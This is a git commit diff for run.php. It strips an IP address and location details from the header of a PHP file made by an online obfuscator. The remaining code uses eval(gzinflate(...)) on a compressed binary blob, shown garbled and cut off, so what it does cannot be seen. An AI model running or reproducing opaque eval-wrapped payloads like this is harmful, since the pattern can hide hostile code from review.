b6ee81f517ccbcf8febba3d0e49f085f61000962
Muhamad Farid <muhammadfarid.alfachri@gmail.com>
2020-03-02 08:32:38 +0700

    Update run.php

--- run.php
+++ run.php
@@ -4,12 +4,6 @@ Site		:	http://www.tool.eddiekidiw.com/phpobfuscator-v-02.html
 Date		:	2020-03-02
 Day		:	Monday
 Time		:	08:31:27
-Ipaddress		:	180.251.112.2
-Hostname		:	180.251.112.2
-City		:	Surabaya
-Country		:	ID
-Region		:	East Java
-Organization		:	AS7713 PT Telekomunikasi Indonesia
 Browser		:	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36
 ***/
 if(!version_compare(PHP_VERSION,'5.6.0','>=')){exit(eval("\x65\x63\x68\x6f\x27\x52\145\161\165\151"."r\x65\163\x20\x50\x48\x50\x20\x35\56\66\x20\157\x72\40\150\x69"."g\x68\145\x72\x27\x3b"));}$������="\147\172"."i\x6e\146\154"."a\x74"."e";eval($������("���0�T�d-��Ҽ����<�ή��Gnj�n��1g�f�ʇ�;���d�8��ރ�4,-4��Bz�J1f�J>T���)�\"SLE�&�j�M0�Xa����\"cl��a���
